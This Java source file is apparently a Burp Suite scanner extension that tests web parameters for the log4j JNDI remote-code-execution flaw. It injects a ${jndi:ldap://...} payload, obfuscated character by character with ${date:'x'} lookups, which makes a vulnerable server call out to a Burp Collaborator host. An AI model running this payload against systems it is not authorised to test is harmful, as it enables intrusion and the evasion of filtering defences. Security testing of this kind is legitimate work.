package BrianW.AKA.BigChan.PowerScanner;

import BrianW.AKA.BigChan.Tools.CollaboratorData;
import BrianW.AKA.BigChan.Tools.FetchCollaboratorWithSig;
import BrianW.AKA.BigChan.Tools.Global;
import BrianW.AKA.BigChan.Tools.utils;
import burp.*;

import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import static java.lang.Thread.sleep;

public class ScanLog4j extends Reporter {
    protected IBurpExtenderCallbacks callbacks;
    protected IExtensionHelpers helpers;

    public ScanLog4j(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        super(callbacks, helpers);
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    public IScanIssue doScanLog4j(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] resp = baseRequestResponse.getResponse();
        byte[] req = baseRequestResponse.getRequest();
        String baseName = insertionPoint.getInsertionPointName();
        byte insertionPointType = insertionPoint.getInsertionPointType();
        String baseValue = insertionPoint.getBaseValue();
        IBurpCollaboratorClientContext collaboratorContext = this.callbacks.createBurpCollaboratorClientContext();
        String collaboratorPayload = collaboratorContext.generatePayload(true);
        String sig = utils.getRandomString(3).toLowerCase();
        String payload = genLog4jPayload(collaboratorPayload, sig);
//        callbacks.printOutput(String.format("generate log4j2 RCE collaboratorPayload: %s.%s, final payload: %s", sig, collaboratorPayload, payload));
        byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
        IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                reqEvil
        );
        pairEvil.setComment(payload);
        FetchCollaboratorWithSig fetch = new FetchCollaboratorWithSig(reporter(
                "log4j RCE vulnerability found",
                String.format("param: %s <br>" +
                                "InsertionPointType: %s <br>" +
                                "Payload: %s"
                        ,
                        baseName,
                        insertionPointType,
                        collaboratorPayload
                ),
                "High",
                "Certain",
                pairEvil
        ),
                collaboratorPayload,
                sig,
                callbacks,
                helpers,
                collaboratorContext
        );
        fetch.start();
        return null;
    }

    private static String genLog4jPayload(String dns, String sig) {
        return String.format("%s${%s.%s}%s", utils.getRandomString(4), obfuscator("jndi:ldap://" + sig), obfuscator(dns), utils.getRandomString(4));
    }

    private static String obfuscator(String payload) {
        StringBuilder finalString = new StringBuilder();
        for (char chr : payload.toCharArray()) {
            String str = String.format("${date:'%s'}", chr);
            finalString.append(str);
        }
        return finalString.toString();
    }
}
